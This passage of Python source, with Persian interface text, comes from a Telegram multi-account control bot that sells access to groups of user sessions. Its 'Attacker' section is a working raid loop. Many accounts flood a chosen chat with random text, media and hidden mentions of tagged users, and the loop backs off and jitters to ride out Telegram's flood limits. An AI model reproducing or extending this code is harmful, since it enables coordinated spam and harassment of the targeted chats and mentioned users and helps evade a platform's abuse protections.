          return
      sessions_in_group = groups_db.get(gname, {}).get("sessions", [])
      role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
      await sp_fn(chat_id,
          f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}",
          buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                      Button.inline("📋 Menu", b"menu_refresh")]])
    elif len(owner_groups) == 1:
      gname = owner_groups[0]
      _err = assign_session_to_group(sess, gname)
      if _err:
          await sp_fn(chat_id, f" {_err}", buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
          return
      sessions_in_group = groups_db[gname].get("sessions", [])
      role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
      await sp_fn(chat_id,
          f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}",
          buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                      Button.inline("📋 Menu", b"menu_refresh")]])
    else:
      # multiple groups — show group buttons to pick
      pending_group_selection[OWNER_ID] = {"waiting_pick_group": True, "sess": sess, "phone": phone}
      rows = [[Button.inline(f"🔘 {g}", f"pickgrp_{g}".encode())] for g in owner_groups]
      rows.append([Button.inline("❌ Cancel", b"menu_refresh")])
      await sp_fn(chat_id,
          f" چند ریموت دارید. اکانت {sess} رو کجا بذارم؟",
          buttons=rows)
      return
    # Ask owner for a custom display name for this session
    pending_group_selection[OWNER_ID] = {"waiting_display_name": True, "sess_for_name": sess}
    await sp_fn(chat_id,
      f" یه اسم نمایشی برای این اکانت بنویس:\n({sess})\n\n/skip برای پیش‌فرض",
      buttons=[[Button.inline("🔘 Skip", b"skip_display_name")]])

# ─────────────────────────────────────────────────────────────────────────────
# GROUP BOT: helpers + lifecycle
# ─────────────────────────────────────────────────────────────────────────────

async def _finalize_group_account(bot, sp_fn, chat_id, tmp, sess, phone, group_name):
    """Complete account addition flow initiated from a group bot."""
    from telethon import Button
    try:
      me = await tmp.get_me()
      await tmp.disconnect()
    except Exception:
      me = None
    if is_group_full(group_name):
      max_acc = groups_db.get(group_name, {}).get("max_accounts")
      await sp_fn(chat_id,
          f" گروه «{group_name}» به سقف {max_acc} اکانت رسیده. اکانت اضافه نشد.",
          buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
      return
    sessions_db[sess] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": []}
    save_db()
    _err = assign_session_to_group(sess, group_name)
    if _err:
      await sp_fn(chat_id, f" خطا در افزودن اکانت: {_err}",
                  buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
      return
    try:
      await start_worker(sess, phone=phone)
    except Exception:
      pass
    name_str = getattr(me, "first_name", sess) if me else sess
    cnt = len(groups_db[group_name].get("sessions", []))
    role_label = "👑 اکانت اول" if cnt == 1 else f"اکانت #{cnt}"
    # Ask for a display name for this account in the group
    _group_pending_tmp = _finalize_group_account._pending if hasattr(_finalize_group_account, '_pending') else None
    from telethon.tl.types import PeerUser
    try:
      owner_id = int(groups_db.get(group_name, {}).get("owner", 0))
    except Exception:
      owner_id = 0
    if owner_id:
      # Store pending state for the owner to provide account name
      if not hasattr(_finalize_group_account, '_all_pendings'):
          _finalize_group_account._all_pendings = {}
      _finalize_group_account._all_pendings[owner_id] = {
          "step": "acc_name", "sess": sess, "group": group_name
      }
      # Use the group_pending dict via the managed_bots bot
      bot_for_group = None
      for gname, gbot in managed_bots.items():
          if gname == group_name:
              bot_for_group = gbot
              break
      if bot_for_group:
          group_pending[owner_id] = {"step": "acc_name", "sess": sess, "group": group_name}
    await sp_fn(chat_id,
      f" اکانت اضافه شد!\n"
      f"نام تلگرام: {name_str}\nشماره: {phone}\nگروه: {group_name}\nنقش: {role_label}\n\n"
      f" یه اسم نمایشی برای این اکانت وارد کن (یا /skip برای رد کردن):",
      buttons=[[Button.inline("🔘 Skip", b"g_accounts")]])


async def start_group_bot(group_name: str) -> None:
    """Start the dedicated Telegram bot client for a group."""
    token = groups_db.get(group_name, {}).get("bot_token", "")
    if not token:
      return
    if group_name in managed_bots:
      return
    try:
      gbot = _make_client(grp_sess_path(group_name, f"grpbot_{group_name}"), session_name=f"grpbot_{group_name}")
      await gbot.start(bot_token=token)
      attach_group_bot_handlers(gbot, group_name)
      managed_bots[group_name] = gbot
      asyncio.create_task(gbot.run_until_disconnected())
      log.warning(f"Group bot started: {group_name}")
    except Exception as e:
      log.warning(f"Group bot start error [{group_name}]: {e}")


async def stop_group_bot(group_name: str) -> None:
    """Stop the dedicated bot for a group."""
    gbot = managed_bots.pop(group_name, None)
    if gbot:
      try:
          await gbot.disconnect()
      except Exception:
          pass


def attach_group_bot_handlers(bot, group_name: str) -> None:
    """Glass-panel management bot for a single group."""
    from telethon import Button

    # ── access helpers ────────────────────────────────────────
    def grp_owner_id():
      """Returns the owner ID of this group (could differ from global OWNER_ID)."""
      return int(groups_db.get(group_name, {}).get("owner", OWNER_ID))

    def is_grp_owner(uid: int) -> bool:
      return uid == OWNER_ID or uid == grp_owner_id()

    def _grp_has_permission(event) -> bool:
      """Allow: global owner, group owner, bot_admins. Ignores subscription expiry."""
      uid = event.sender_id
      if is_grp_owner(uid):
          return True
      return uid in groups_db.get(group_name, {}).get("bot_admins", [])

    def grp_guard(event) -> bool:
      """Same as _grp_has_permission but also blocks non-owner access once the remote's subscription has expired."""
      if not _grp_has_permission(event):
          return False
      if event.sender_id != OWNER_ID and is_group_expired(group_name):
          return False
      return True

    def grp_owner_guard(event) -> bool:
      """Stricter: only global owner or group owner can do admin management."""
      return is_grp_owner(event.sender_id)

    def grp_sessions():
      return groups_db.get(group_name, {}).get("sessions", [])

    panel_msg_id: Dict[int, int] = {}

    async def sp(chat_id, text, buttons=None):
      """Send spoiler panel message, deleting any previous panel first (single living message)."""
      old_mid = panel_msg_id.pop(chat_id, None)
      if old_mid:
          try:
              await bot.delete_messages(chat_id, [old_mid])
          except Exception:
              pass
      try:
          msg = await bot.send_message(chat_id, f"<spoiler>{text}</spoiler>",
                                         parse_mode="html", buttons=buttons)
      except Exception:
          try:
              msg = await bot.send_message(chat_id, text, buttons=buttons)
          except Exception:
              return None
      if msg:
          panel_msg_id[chat_id] = msg.id
      return msg

    async def sp_edit(event, text, buttons=None, parse_mode=None):
      """Edit the tracked panel message; fallback to sending new if not found."""
      chat_id = event.chat_id
      mid = panel_msg_id.get(chat_id)
      if mid:
          try:
              await bot.edit_message(
                    chat_id, mid,
                    f"<spoiler>{text}</spoiler>",
                    parse_mode="html",
                    buttons=buttons,
              )
              return
          except Exception:
              pass
      await sp(chat_id, text, buttons)

    def main_menu():
      cnt = len(grp_sessions())
      online = sum(1 for s in grp_sessions() if s in managed)
      selfs = sum(1 for s in grp_sessions()
                    if managed.get(s, {}).get("state", {}).get("auto_reply"))
      return [
          [Button.inline(f"👤 Accounts ({cnt})  {online}", b"g_accounts"),],
          [Button.inline(f"🤖 Self ({selfs} active)", b"g_enemy"),
             Button.inline("⚔️ Attacker", b"g_atk")],
          [Button.inline("➡️ Join / Leave", b"g_joinleave"),
             Button.inline("📦 Bulk Action", b"g_action")],
          [Button.inline("📌 Turn On All Accounts", b"g_enableall"),
             Button.inline("📌 Turn Off All", b"g_disableall")],
          [Button.inline("👥 Group Cleaner", b"g_cleanall")],
          [Button.inline("👤 Profile", b"g_profile"),
             Button.inline("⚙️ Settings", b"g_settings")],
          [Button.inline("👥 Group IDs", b"g_groupids")],
          [Button.inline("👮 Admins", b"g_admins"),
             Button.inline("📊 Status", b"g_status")],
          [Button.inline("🔄 Refresh", b"g_home")],
      ]

    def home_text():
      cnt = len(grp_sessions())
      online = sum(1 for s in grp_sessions() if s in managed)
      return (
          f" پنل گروه: {group_name}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n"
          f" اکانت: {cnt}   آنلاین: {online}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n"
          f"یه گزینه انتخاب کن:"
      )

    # ── /start ────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=re.compile(r'^/(start|panel)$', re.IGNORECASE)))
    async def g_start(event):
      if not _grp_has_permission(event):
          return
      chat_id = event.chat_id
      group_pending.pop(event.sender_id, None)
      old_mid = panel_msg_id.get(chat_id)
      if old_mid:
          try:
              await bot.delete_messages(chat_id, [old_mid])
          except Exception:
              pass
          panel_msg_id.pop(chat_id, None)
      try:
          await event.delete()
      except Exception:
          pass
      if event.sender_id != OWNER_ID and is_group_expired(group_name):
          await sp(chat_id,
              f"⚠️ ریموت «{group_name}»\n━━━━━━━━━━━━━━\n"
              f"اشتراک این ریموت منقضی شده.\n"
              f"لطفاً اشتراک خود را آپدیت کنید.",
              buttons=[[Button.inline("🔄 Refresh", b"g_home")]])
          return
      await sp(chat_id, home_text(), buttons=main_menu())

    # ── home/refresh ──────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_home"))
    async def g_home_cb(event):
      if not _grp_has_permission(event):
          return await event.answer()
      group_pending.pop(event.sender_id, None)
      if event.sender_id != OWNER_ID and is_group_expired(group_name):
          await sp_edit(event,
              f"⚠️ ریموت «{group_name}»\n━━━━━━━━━━━━━━\n"
              f"اشتراک این ریموت منقضی شده.\n"
              f"لطفاً اشتراک خود را آپدیت کنید.",
              buttons=[[Button.inline("🔄 Refresh", b"g_home")]])
          return await event.answer()
      await sp_edit(event, home_text(), buttons=main_menu())
      await event.answer(" رفرش شد")

    # ── accounts list ─────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_accounts"))
    async def g_accounts_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      max_acc = groups_db.get(group_name, {}).get("max_accounts")
      current = len(sessions)
      limit_line = f"({current}/{max_acc} اکانت)" if max_acc else f"({current} اکانت)"
      rows = []
      for s in sessions:
          icon = "🟢" if s in managed else "🔴"
          phone = sessions_db.get(s, {}).get("phone", "?")
          disp = sessions_db.get(s, {}).get("display_name") or s
          rows.append([Button.inline(f"🔢 {icon} {disp} — {phone}", f"ga_{s}".encode())])
      full = max_acc and current >= int(max_acc)
      if not full:
          rows.append([Button.inline("👤 Add Account", b"g_add_acc")])
      else:
          rows.append([Button.inline(f"👥 Group Limit Full ({max_acc})", b"g_accounts")])
      rows.append([Button.inline("🔙 Back", b"g_home")])
      txt = f" Accountsی گروه {group_name}\n━━━━━━━━━━━━━━\n{limit_line}"
      await sp_edit(event, txt, buttons=rows)
      await event.answer()

    # ── session detail ────────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=b"ga_(.+)"))
    async def g_sess_detail(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      info = sessions_db.get(sess, {})
      meta = managed.get(sess)
      status = "🟢 آنلاین" if meta else "🔴 آفلاین"
      ids = list(meta["state"].get("locked_users", set())) if meta else []
      phone = info.get("phone", "?")
      txt = (
          f" {sess}\n━━━━━━━━━━━━━━\n"
          f" شماره: {phone}\n"
          f"وضعیت: {status}\n"
          f"آیدی‌ها: {', '.join(str(x) for x in ids) or '—'}"
      )
      toggle_btn = (
          Button.inline("👤 Turn Off Account", f"gtog_off_{sess}".encode())
          if meta else
          Button.inline("👤 Turn On Account", f"gtog_on_{sess}".encode())
      )
      buttons = [
          [toggle_btn],
          [Button.inline("🔘 IDs", f"gids_{sess}".encode())],
          [Button.inline("👤 Account Cleaner", f"g_clean_{sess}".encode())],
          [Button.inline("🗑 Delete Account", f"gdelacc_{sess}".encode())],
          [Button.inline("🔙 Back", b"g_accounts")],
      ]
      await sp_edit(event, txt, buttons=buttons)
      await event.answer()

    # ── toggle account on/off (group bot) ─────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gtog_on_(.+)")))
    async def gtog_on_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      if sess in managed:
          return await event.answer(" قبلاً روشنه", alert=True)
      await start_worker(sess)
      if sess in managed:
          await event.answer(" اکانت روشن شد", alert=True)
      else:
          await event.answer(" روشن نشد — فایل session موجود نیست", alert=True)
      await sp_edit(event, f" {sess} — وضعیت: {'🟢 آنلاین' if sess in managed else '🔴 آفلاین'}",
                     buttons=[[Button.inline("🔙 Back", f"ga_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gtog_off_(.+)")))
    async def gtog_off_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      meta = managed.pop(sess, None)
      if meta:
          t = meta.get("task")
          if t:
              t.cancel()
          try:
              await meta["client"].disconnect()
          except Exception:
              pass
          await event.answer(" اکانت خاموش شد", alert=True)
      else:
          await event.answer(" قبلاً خاموشه", alert=True)
      await sp_edit(event, f" {sess} — وضعیت:  آفلاین",
                     buttons=[[Button.inline("🔙 Back", f"ga_{sess}".encode())]])

    # ── disable all accounts (group bot) ─────────────────────
    @bot.on(events.CallbackQuery(data=b"g_disableall"))
    async def g_disableall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      online = [s for s in grp_sessions() if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await sp_edit(event,
          f" Turn Off All اکانت‌ها\n━━━━━━━━━━━━━━\n"
          f" {len(online)} اکانت آنلاین خاموش می‌شن\n\n"
          f"مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Turn Off All ({len(online)})", b"g_disableall_ok")],
              [Button.inline("❌ Cancel", b"g_home")],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_disableall_ok"))
    async def g_disableall_ok_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      turned_off = 0
      for sess in sessions:
          meta = managed.pop(sess, None)
          if meta:
              t = meta.get("task")
              if t:
                    t.cancel()
              try:
                    await meta["client"].disconnect()
              except Exception:
                    pass
              turned_off += 1
      await sp_edit(event,
          f" {turned_off} اکانت خاموش شدن.\n همه آفلاین.",
          buttons=[[Button.inline("📋 Menu", b"g_home")]])
      await event.answer(f" {turned_off} اکانت خاموش شد", alert=True)

    # ── enable all accounts (group bot) ──────────────────────
    @bot.on(events.CallbackQuery(data=b"g_enableall"))
    async def g_enableall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      offline = [s for s in sessions if s not in managed]
      if not offline:
          return await event.answer(" همه اکانت‌ها قبلاً روشنن", alert=True)
      await event.answer(" در حال روشن کردن...")
      await sp_edit(event,
          f" در حال روشن کردن {len(offline)} اکانت...",
          buttons=[[Button.inline("📋 Menu", b"g_home")]])

      async def _do_enable():
          turned_on = failed = 0
          for sess in offline:
              await start_worker(sess)
              if sess in managed:
                    turned_on += 1
              else:
                    failed += 1
              await asyncio.sleep(1)
          await bot.send_message(event.chat_id,
              f" روشن کردن تموم شد!\n روشن شد: {turned_on}\n ناموفق: {failed}",
              buttons=[[Button.inline("📋 Menu", b"g_home")]])
      asyncio.get_event_loop().create_task(_do_enable())

    # ── delete account (group bot) ────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gdelacc_(.+)")))
    async def gdelacc_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      phone = sessions_db.get(sess, {}).get("phone", "?")
      await sp_edit(event,
          f" Delete Account\n━━━━━━━━━━━━━━\n"
          f"اکانت: {sess}\nشماره: {phone}\n\n"
          f" مطمئنی؟ اکانت از گروه و دیتابیس حذف میشه.",
          buttons=[
              [Button.inline("✅ Yes, Delete", f"gdelacc_ok_{sess}".encode()),
                 Button.inline("❌ No", f"ga_{sess}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gdelacc_ok_(.+)")))
    async def gdelacc_ok_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.pop(sess, None)
      if meta:
          t = meta.get("task")
          if t:
              t.cancel()
          try:
              await meta["client"].disconnect()
          except Exception:
              pass
      if group_name in groups_db:
          slist = groups_db[group_name].get("sessions", [])
          if sess in slist:
              slist.remove(sess)
          save_groups()
      sessions_db.pop(sess, None)
      save_db()
      await sp_edit(event,
          f" اکانت «{sess}» حذف شد.",
          buttons=[[Button.inline("🔙 Back to Accounts", b"g_accounts")]])

    # ── add account ───────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_add_acc"))
    async def g_add_acc_cb(event):
      if not grp_guard(event):
          return await event.answer()
      if is_group_full(group_name):
          max_acc = groups_db.get(group_name, {}).get("max_accounts")
          await sp_edit(event,
              f" گروه «{group_name}» به سقف {max_acc} اکانت رسیده.\nامکان افزودن اکانت جدید وجود ندارد.",
              buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
          return await event.answer()
      group_pending[event.sender_id] = {"step": "phone", "group": group_name}
      await sp_edit(event,
          " شماره تلفن اکانت رو بنویس:\n(مثال: +989xxxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", b"g_accounts")]])
      await event.answer()

    # ── send message panel ────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_send"))
    async def g_send_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "send_target", "group": group_name}
      await sp_edit(event,
          " آیدی یا یوزرنیم چت مقصد رو بنویس:\n(مثال: @group یا -100xxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", b"g_home")]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: ATTACKER  (g_atk prefix)
    # ═══════════════════════════════════════════════════════════
    def _atk_state():
      atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
          "active": False, "target": "", "items": [], "delay": 2, "mention_ids": []
      })
      atk.setdefault("mention_ids", [])
      atk.setdefault("seq_mode", False)
      atk.setdefault("seq_interval", 1)
      atk.setdefault("auto_stop_hours", 0)
      return atk

    async def _atk_loop():
      _key = group_name
      if _key not in atk_stats:
          atk_stats[_key] = {"sent": 0, "errors": 0, "started_at": datetime.utcnow(), "target": ""}
      _grp_flood_cd: Dict[str, float] = {}   # sess -> epoch when cooldown expires (flood/conn)
      _grp_conn_cd:  Dict[str, float] = {}   # sess -> epoch for connection-error cooldown
      _grp_mention_cache: list = []
      _grp_mention_cache_ids: list = []
      _grp_cached_mention_target = None      # target used when building mention cache
      _grp_cached_target_raw: str = ""       # last raw target string
      _grp_cached_target = None              # parsed result (invalidated when raw changes)
      _grp_rr_idx: int = 0                   # round-robin index for sequential mode
      _grp_loop_start = time.time()          # for auto-stop timer

      while True:
          try:
              atk = groups_db.get(group_name, {}).get("attacker", {})
              if not atk.get("active"):
                    break
              # ── auto-stop after N hours ──────────────────────────────
              _grp_as_hours = float(atk.get("auto_stop_hours", 0))
              if _grp_as_hours > 0 and (time.time() - _grp_loop_start) >= _grp_as_hours * 3600:
                    atk["active"] = False
                    save_groups()
                    log.info(f"[atk:{group_name}] auto-stop after {_grp_as_hours}h")
                    break
              target_raw = atk.get("target", "")
              atk_stats[_key]["target"] = target_raw
              items  = atk.get("items", [])
              delay  = max(0.3, float(atk.get("delay", 2)))
              # Cache parsed target — re-parse only when raw string changes
              if target_raw != _grp_cached_target_raw:
                    _grp_cached_target_raw = target_raw
                    _raw = str(target_raw).strip()
                    for _pfx in ("https://t.me/", "http://t.me/", "t.me/"):
                        if _raw.startswith(_pfx):
                            _raw = _raw[len(_pfx):]
                            break
                    _raw = _raw.lstrip("@")
                    try:
                        _grp_cached_target = int(_raw)
                    except ValueError:
                        _grp_cached_target = _raw if _raw else None
              target = _grp_cached_target
              if not target or not items:
                    await asyncio.sleep(1)
                    continue
              _grp_all_sess = grp_sessions()
              _grp_sel_sess = atk.get("sel_sessions", None)
              if _grp_sel_sess is not None:
                    _grp_all_sess = [s for s in _grp_all_sess if s in _grp_sel_sess]
              online = [s for s in _grp_all_sess if s in managed]
              if not online:
                    await asyncio.sleep(2)
                    continue

              # rebuild mention cache — stores (sym, uid_int) tuples, sent as tg://user?id= links
              cur_ids = atk.get("mention_ids", [])
              if cur_ids != _grp_mention_cache_ids:
                    _grp_mention_cache_ids = list(cur_ids)
                    _grp_mention_cache.clear()
                    _sym = groups_db.get(group_name, {}).get("atk_char", "𒀽")
                    _res_cli_g = managed.get(online[0], {}).get("client") if online else None
                    for mid in cur_ids:
                        mid_s = str(mid).strip()
                        if mid_s.startswith("@"):
                            _uid_g = None
                            if _res_cli_g:
                                try:
                                    _ent_g = await _res_cli_g.get_entity(mid_s)
                                    _uid_g = getattr(_ent_g, 'id', None)
                                except Exception:
                                    pass
                            if _uid_g:
                                _grp_mention_cache.append((_sym, _uid_g))
                        else:
                            try:
                                _grp_mention_cache.append((_sym, int(mid_s)))
                            except ValueError:
                                pass

              def _build_grp_mention_msg(base_text: str):
                  from telethon.tl.types import MessageEntityTextUrl
                  if not _grp_mention_cache:
                      return base_text, None
                  parts = [base_text]
                  entities = []
                  offset = len(base_text.encode("utf-16-le")) // 2
                  for sym, uid in _grp_mention_cache:
                      parts.append("\n" + sym)
                      sym_len = len(sym.encode("utf-16-le")) // 2
                      entities.append(MessageEntityTextUrl(
                          offset=offset + 1, length=sym_len,
                          url=f"tg://user?id={uid}",
                      ))
                      offset += 1 + sym_len
                  return "".join(parts), entities if entities else None

              txt_items_grp  = [i for i in items if i["type"] == "text"]
              med_items_grp  = [i for i in items if i["type"] not in ("text", "sticker")]
              combo_mode_grp = atk.get("combo_mode", False)

              # ── parallel send: all accounts fire simultaneously ──
              if not groups_db.get(group_name, {}).get("attacker", {}).get("active"):
                    continue

              _now = time.time()
              _grp_ready = [s for s in list(online)
                              if _now >= _grp_flood_cd.get(s, 0)
                              and _now >= _grp_conn_cd.get(s, 0)
                              and managed.get(s)]
              if not _grp_ready:
                    await asyncio.sleep(1)
                    continue

              async def _grp_send_one(sess,
                                        _t=target,
                                        _ti=txt_items_grp, _mi=med_items_grp,
                                        _cm=combo_mode_grp, _it=items):
                    meta = managed.get(sess)
                    if not meta:
                        return
                    _cli = meta.get("client")
                    if _cli is None or not _cli.is_connected():
                        _grp_conn_cd[sess] = time.time() + 30
                        return
                    _combo_text = ""
                    if _cm and _ti and _mi:
                        _item = random.choice(_mi)
                        _combo_text = random.choice(_ti)["val"]
                    elif _ti and _mi:
                        _pool = _ti if random.random() < 0.5 else _mi
                        _item = random.choice(_pool)
                    else:
                        _item = random.choice(_it)
                    try:
                        async def _do_send_grp():
                            _state = meta.get("state", {})
                            if _state.get("autotyping"):
                                try:
                                    await _cli(SetTypingRequest(peer=_t, action=SendMessageTypingAction()))
                                except Exception:
                                    pass
                                await asyncio.sleep(0.3)
                            elif _state.get("autorecord"):
                                try:
                                    await _cli(SetTypingRequest(peer=_t, action=SendMessageRecordAudioAction()))
                                except Exception:
                                    pass
                                await asyncio.sleep(0.3)

                            if _item["type"] == "text":
                                _txt_g, _ents_g = _build_grp_mention_msg(_item["val"])
                                if _ents_g:
                                    await _cli.send_message(_t, _txt_g, formatting_entities=_ents_g)
                                else:
                                    await _cli.send_message(_t, _txt_g, parse_mode="md")
                            elif _item["type"] == "sticker":
                                fp = _item["val"]
                                if os.path.exists(fp):
                                    await _cli.send_file(_t, fp)
                                    if _grp_mention_cache:
                                        _mt_g, _me_g = _build_grp_mention_msg("")
                                        _mt_g = _mt_g.strip()
                                        if _mt_g:
                                            if _me_g:
                                                await _cli.send_message(_t, _mt_g, formatting_entities=_me_g)
                                            else:
                                                await _cli.send_message(_t, _mt_g, parse_mode="md")
                            else:
                                fp = _item["val"]
                                if os.path.exists(fp):
                                    _base_g = _combo_text if _combo_text else (_item.get("caption") or "")
                                    _cap_g, _cents_g = _build_grp_mention_msg(_base_g)
                                    await _cli.send_file(_t, fp,
                                                         caption=_cap_g if _cap_g.strip() else None,
                                                         formatting_entities=_cents_g if _cents_g else None,
                                                         parse_mode=None if _cents_g else "md")

                        await asyncio.wait_for(_do_send_grp(), timeout=25)
                        atk_stats[_key]["sent"] += 1
                    except asyncio.TimeoutError:
                        _grp_conn_cd[sess] = time.time() + 45
                        atk_stats[_key]["errors"] += 1
                        log.debug(f"[atk:{group_name}] timeout {sess} — conn cooldown 45s")
                    except FloodWaitError as _e:
                        _w = _e.seconds + random.randint(2, 8)
                        _grp_flood_cd[sess] = time.time() + _w
                        atk_stats[_key]["errors"] += 1
                    except PeerFloodError:
                        _grp_flood_cd[sess] = time.time() + 60 + random.randint(10, 30)
                        atk_stats[_key]["errors"] += 1
                    except (UserBannedInChannelError, ChatWriteForbiddenError):
                        atk_stats[_key]["errors"] += 1
                    except Exception as _e2:
                        log.debug(f"[atk:{group_name}] send error {sess}: {_e2}")
                        atk_stats[_key]["errors"] += 1

              # تایمینگ دقیق: delay = فاصله کامل بین راندها
              _grp_round_start = time.time()
              if atk.get("seq_mode", False) and _grp_ready:
                  # Sequential: یه اکانت در هر seq_interval ثانیه، round-robin
                  _seq_sess_grp = _grp_ready[_grp_rr_idx % len(_grp_ready)]
                  _grp_rr_idx += 1
                  _grp_seq_iv = max(0.1, float(atk.get("seq_interval", 1)))
                  try:
                      await asyncio.wait_for(_grp_send_one(_seq_sess_grp), timeout=15)
                  except asyncio.CancelledError:
                      raise
                  except Exception:
                      pass
                  _grp_elapsed = time.time() - _grp_round_start
                  await asyncio.sleep(max(0.0, _grp_seq_iv - _grp_elapsed))
              else:
                  _atk_sem = _ATK_SEM.setdefault(group_name, asyncio.Semaphore(20))
                  async def _grp_send_one_guarded(s, _sem=_atk_sem):
                      async with _sem:
                          await _grp_send_one(s)
                  await asyncio.wait_for(
                        asyncio.gather(*[_grp_send_one_guarded(s) for s in _grp_ready], return_exceptions=True),
                        timeout=30 + len(_grp_ready) * 5
                  )
                  _grp_elapsed = time.time() - _grp_round_start
                  await asyncio.sleep(max(0.1, delay - _grp_elapsed))

          except asyncio.CancelledError:
              break
          except Exception as _loop_err:
              log.warning(f"[atk:{group_name}] loop error (continuing): {_loop_err}")
              await asyncio.sleep(3)

    def _atk_panel_text():
      atk = _atk_state()
      active = atk.get("active", False)
      target = atk.get("target", "—")
      items  = atk.get("items", [])
      delay  = atk.get("delay", 2)
      txts   = sum(1 for i in items if i["type"] == "text")
      medias = len(items) - txts
      tags   = len(atk.get("mention_ids", []))
      combo  = atk.get("combo_mode", False)
      seq    = atk.get("seq_mode", False)
      seq_iv = atk.get("seq_interval", 1)
      ash    = atk.get("auto_stop_hours", 0)
      ash_txt = f"{ash} ساعت" if ash else "غیرفعال"
      return (
          f"{pe('⚔️')} Attacker — گروه {group_name}\n━━━━━━━━━━━━━━\n"
          f"وضعیت: {pe('🟢') + ' فعال' if active else pe('🔴') + ' متوقف'}\n"
          f"مقصد: {target}\n"
          f"تاخیر: {delay} ثانیه\n"
          f"{pe('📝')} متن: {txts}  |  {pe('🖼')} مدیا: {medias}\n"
          f"{pe('👥')} منشن تگ: {tags} نفر\n"
          f"{pe('🔀')} حالت ترکیبی: {pe('✅') + ' فعال' if combo else pe('❌') + ' غیرفعال'}\n"
          f"{pe('🔁')} Sequential: {pe('✅') + f' فعال (هر {seq_iv} ثانیه یه اکانت)' if seq else pe('❌') + ' غیرفعال'}\n"
          f"{pe('⏰')} خاموش خودکار: {ash_txt}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('⚠️') + ' در حال ارسال...' if active else 'آماده'}"
      )

    def _atk_buttons():
      atk = _atk_state()
      active = atk.get("active", False)
      tag_cnt = len(atk.get("mention_ids", []))
      target = atk.get("target", "")
      all_grp_sessions = grp_sessions()
      sel_grp_sessions = atk.get("sel_sessions", None)
      grp_sel_count = len(sel_grp_sessions) if sel_grp_sessions is not None else len(all_grp_sessions)
      grp_total_count = len(all_grp_sessions)
      ash = atk.get("auto_stop_hours", 0)
      ash_lbl = f"{ash}h" if ash else "خاموش"
      toggle = [Button.inline("⏹ Stop", b"gatk_stop")] if active else \
                 [Button.inline("🟢 Start Attack", b"gatk_start")]
      return [
          toggle,
          [Button.inline(f"👤 اکانت‌های اتکر: {grp_sel_count}/{grp_total_count}", b"gatk_selsess")],
          [Button.inline("👥 From Joined Groups", b"gatk_selgrp")],
          [Button.inline("🎯 Manual Target", b"gatk_settgt"),
             Button.inline(f"⚔️ Delay ({atk.get('delay',2)}s)", b"gatk_delay")],
          [Button.inline("➕ Add Text", b"gatk_addtext"),
             Button.inline("➕ Add Photo", b"gatk_addphoto")],
          [Button.inline("➕ Add GIF", b"gatk_addgif"),
             Button.inline("➕ Add Video", b"gatk_addvideo")],
          [Button.inline("➕ Add Sticker", b"gatk_addsticker")],
          [Button.inline(f"🔀 Combo: {'✅' if atk.get('combo_mode') else '❌'}", b"gatk_combo")],
          [Button.inline(f"🔁 Sequential: {'✅' if atk.get('seq_mode') else '❌'}", b"gatk_seqmode"),
           Button.inline(f"⏱ Seq Interval ({atk.get('seq_interval', 1)}s)", b"gatk_seqinterval")],
          [Button.inline(f"⏰ خاموش خودکار: {ash_lbl}", b"gatk_autostop")],
          [Button.inline(f"🔘 Mentions ({tag_cnt})", b"gatk_tags")],
          [Button.inline("📌 Clear All Content", b"gatk_clr")],
          [Button.inline("🔙 Back", b"g_home")],
      ]

    def _live_stats_text():
      atk  = groups_db.get(group_name, {}).get("attacker", {})
      key  = group_name
      stats = atk_stats.get(key, {})
      sent  = stats.get("sent", 0)
      errors = stats.get("errors", 0)
      started_at = stats.get("started_at")
      active = atk.get("active", False)
      target = atk.get("target", "—")
